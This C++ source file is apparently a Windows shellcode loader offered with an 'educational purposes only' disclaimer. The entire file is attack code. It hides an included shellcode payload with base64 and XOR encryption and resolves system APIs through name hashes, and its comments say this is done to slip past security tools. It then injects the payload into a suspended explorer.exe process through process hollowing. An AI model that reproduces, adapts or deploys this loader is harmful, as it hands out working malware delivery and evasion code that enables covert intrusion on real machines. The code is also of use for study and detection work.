/*
 * DISCLAIMER: 
 * This code was created solely for educational purposes and is intended for use in controlled environments only.
 * Unauthorized use of this code outside of these settings is strictly prohibited. 
 * The author, Stiven Mayorga A.k.a @Stiven.Hacker, takes no responsibility for any misuse or damage caused by this code.
 */

#include <windows.h>
#include <iostream>
#include <vector>
#include <wincrypt.h>
#include <string>
#include <stdexcept>
#include "Import Your Shellcode.h"  // Include the file with the encoded shellcode

// Computes the hash of a string using a custom algorithm.
// This hash is later used to identify API functions by their hashed names.
DWORD hash_function(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash >> 13) | (hash << 19);
        hash += *str++;
    }
    return hash;
}

// Base64 encoding map
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

// Encodes binary data into a Base64 string.
// This function is used to encode the shellcode for evasion purposes.
std::string base64_encode(const unsigned char* buf, size_t bufLen) {
    std::string ret;
    int val = 0;
    int valb = -6;
    for (size_t i = 0; i < bufLen; ++i) {
        val = (val << 8) + buf[i];
        valb += 8;
        while (valb >= 0) {
            ret.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) ret.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (ret.size() % 4) ret.push_back('=');
    return ret;
}

// Decodes a Base64 string back into binary data.
// This is necessary to decode the shellcode before executing it.
std::vector<unsigned char> base64_decode(const std::string& encoded_string) {
    std::vector<unsigned char> ret;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0;
    int valb = -8;
    for (unsigned char c : encoded_string) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            ret.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return ret;
}

// Resolves a function's address dynamically by hashing the function's name.
// This technique is used to avoid detection by traditional security mechanisms.
FARPROC get_api_function(DWORD module_hash, DWORD function_hash) {
    HMODULE module = nullptr;
    const char* module_names[] = { "kernel32.dll", "advapi32.dll", "user32.dll", "gdi32.dll", NULL };
    for (int i = 0; module_names[i] != NULL; ++i) {
        module = LoadLibraryA(module_names[i]);
        if (module && hash_function(module_names[i]) == module_hash) {
            break;
        }
    }
    if (module == NULL) {
        std::cerr << "Error loading the module.\n";
        exit(EXIT_FAILURE);
    }

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)module + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* functions = (DWORD*)((BYTE*)module + export_dir->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)module + export_dir->AddressOfNameOrdinals);
    DWORD* names = (DWORD*)((BYTE*)module + export_dir->AddressOfNames);

    // Loop through the export table to find the function by its hash.
    for (DWORD i = 0; i < export_dir->NumberOfNames; ++i) {
        const char* func_name = (const char*)((BYTE*)module + names[i]);
        if (hash_function(func_name) == function_hash) {
            return (FARPROC)((BYTE*)module + functions[ordinals[i]]);
        }
    }

    std::cerr << "Error retrieving the function address.\n";
    exit(EXIT_FAILURE);
}

// Generates a cryptographically secure key of the specified length.
// This key will be used to encrypt and decrypt the shellcode.
std::vector<unsigned char> generate_key(SIZE_T length) {
    std::vector<unsigned char> key(length);
    HCRYPTPROV hProv;
    auto CryptAcquireContextA = (decltype(&::CryptAcquireContextA))get_api_function(hash_function("advapi32.dll"), hash_function("CryptAcquireContextA"));
    auto CryptGenRandom = (decltype(&::CryptGenRandom))get_api_function(hash_function("advapi32.dll"), hash_function("CryptGenRandom"));
    auto CryptReleaseContext = (decltype(&::CryptReleaseContext))get_api_function(hash_function("advapi32.dll"), hash_function("CryptReleaseContext"));

    // Acquire a cryptographic context for generating random data.
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "Error acquiring cryptographic context.\n";
        exit(EXIT_FAILURE);
    }
    // Generate a random key.
    if (!CryptGenRandom(hProv, (DWORD)length, key.data())) {
        std::cerr << "Error generating cryptographic key.\n";
        CryptReleaseContext(hProv, 0);
        exit(EXIT_FAILURE);
    }
    CryptReleaseContext(hProv, 0);
    return key;
}

// XOR encryption/decryption function.
// The same function is used to both encrypt and decrypt the shellcode.
void xor_encrypt_decrypt(unsigned char* data, SIZE_T data_len, const std::vector<unsigned char>& key) {
    for (SIZE_T i = 0; i < data_len; ++i) {
        data[i] ^= key[i % key.size()];
    }
}

// Implements control flow flattening to obfuscate the program's execution path.
// This makes it harder for static analysis tools to understand the program's logic.
void control_flow_flattening(bool& continue_execution, int& state) {
    while (continue_execution) {
        switch (state) {
        case 0:
            // Initialization state
            state = 1;
            break;

        case 1:
            // State to verify process hollowing
            state = 2;
            break;

        case 2:
            // State to verify additional conditions, e.g., data integrity
            state = 3;
            break;

        case 3:
            // Final state to stop execution
            continue_execution = false;
            break;

        default:
            // Handle unknown states
            continue_execution = false;
            break;
        }
    }
}

// Performs process hollowing by injecting shellcode into a legitimate process.
// This function suspends the target process, replaces its memory with shellcode, and resumes it.
bool process_hollowing(const char* target_path, unsigned char* shellcode, SIZE_T shellcode_size, const std::vector<unsigned char>& key) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    auto CreateProcessA = (decltype(&::CreateProcessA))get_api_function(hash_function("kernel32.dll"), hash_function("CreateProcessA"));
    auto GetThreadContext = (decltype(&::GetThreadContext))get_api_function(hash_function("kernel32.dll"), hash_function("GetThreadContext"));
    auto VirtualAllocEx = (decltype(&::VirtualAllocEx))get_api_function(hash_function("kernel32.dll"), hash_function("VirtualAllocEx"));
    auto WriteProcessMemory = (decltype(&::WriteProcessMemory))get_api_function(hash_function("kernel32.dll"), hash_function("WriteProcessMemory"));
    auto VirtualProtectEx = (decltype(&::VirtualProtectEx))get_api_function(hash_function("kernel32.dll"), hash_function("VirtualProtectEx"));
    auto SetThreadContext = (decltype(&::SetThreadContext))get_api_function(hash_function("kernel32.dll"), hash_function("SetThreadContext"));
    auto ResumeThread = (decltype(&::ResumeThread))get_api_function(hash_function("kernel32.dll"), hash_function("ResumeThread"));
    auto TerminateProcess = (decltype(&::TerminateProcess))get_api_function(hash_function("kernel32.dll"), hash_function("TerminateProcess"));
    auto CloseHandle = (decltype(&::CloseHandle))get_api_function(hash_function("kernel32.dll"), hash_function("CloseHandle"));

    // Create the target process in a suspended state.
    if (!CreateProcessA(target_path, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "Error creating target process.\n";
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Error getting thread context.\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Allocate memory in the target process for the shellcode.
    LPVOID pImageBase = VirtualAllocEx(pi.hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        std::cerr << "Error allocating memory in target process.\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Decrypt the shellcode before injecting it into the target process.
    xor_encrypt_decrypt(shellcode, shellcode_size, key);

    // Write the shellcode into the allocated memory in the target process.
    if (!WriteProcessMemory(pi.hProcess, pImageBase, shellcode, shellcode_size, NULL)) {
        std::cerr << "Error writing shellcode to target process memory.\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    DWORD oldProtect;
    // Change memory protection to execute-only to avoid detection.
    if (!VirtualProtectEx(pi.hProcess, pImageBase, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Error changing memory protection in target process.\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

#ifdef _WIN64
    ctx.Rcx = reinterpret_cast<uintptr_t>(pImageBase);
#else
    ctx.Eax = reinterpret_cast<uintptr_t>(pImageBase);
#endif

    // Set the modified context (pointing to the shellcode) back to the thread.
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Error setting thread context.\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    // Resume the thread, allowing the process to continue execution with the injected shellcode.
    if (ResumeThread(pi.hThread) == -1) {
        std::cerr << "Error resuming target process.\n";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int main() {
    const char* target_path = "C:\\Windows\\explorer.exe";

    // Encode the shellcode in Base64
    std::string shellcode_base64 = base64_encode(DesarrolloMagico_bin, DesarrolloMagico_bin_len); //Shellcode Name Bin and Len DesarrolloMagico_bin, DesarrolloMagico_bin_len replace with yours

    // Decode the shellcode from Base64
    std::vector<unsigned char> decoded_shellcode = base64_decode(shellcode_base64);

    // Generate a cryptographically secure encryption key based on the length of the decoded shellcode
    std::vector<unsigned char> key = generate_key(decoded_shellcode.size());
    xor_encrypt_decrypt(decoded_shellcode.data(), decoded_shellcode.size(), key);

    // Implement control flow flattening in the main function
    bool continue_execution = true;
    int state = 0;
    control_flow_flattening(continue_execution, state);

    if (state == 3 && process_hollowing(target_path, decoded_shellcode.data(), decoded_shellcode.size(), key)) {
        std::cout << "Process hollowing successful.\n";
    }
    else {
        std::cerr << "Process hollowing failed.\n";
    }

    auto SecureZeroMemory = (decltype(&::SecureZeroMemory))get_api_function(hash_function("kernel32.dll"), hash_function("SecureZeroMemory"));
    SecureZeroMemory(decoded_shellcode.data(), decoded_shellcode.size());

    return 0;
}